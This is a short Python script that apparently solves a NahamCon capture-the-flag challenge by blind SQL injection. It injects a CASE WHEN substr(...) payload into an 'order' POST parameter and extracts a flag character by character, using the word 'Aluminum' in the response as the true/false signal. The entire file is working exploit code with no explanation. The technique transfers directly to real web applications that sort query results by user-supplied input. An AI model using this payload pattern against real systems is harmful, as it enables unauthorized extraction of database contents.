from os import posix_spawn
import requests
import string


chars = string.ascii_lowercase + "_" + "{}"

def check_flag(char,pos):
    payload = "symbol limit 1,(select CASE WHEN substr((select flag from flag),{},1) = '{}' THEN 1 ELSE 0 END)".format(pos,char)
    r = requests.post("http://challenge.nahamcon.com:32238/",data={"search":"a","order":payload})
    if "Aluminum" in r.text:
        return char
flag = ""
for i in range(1,39):
    for char in chars :
        res = check_flag(char,str(i))
        if res != None:
            flag += char
            print(flag)
            break
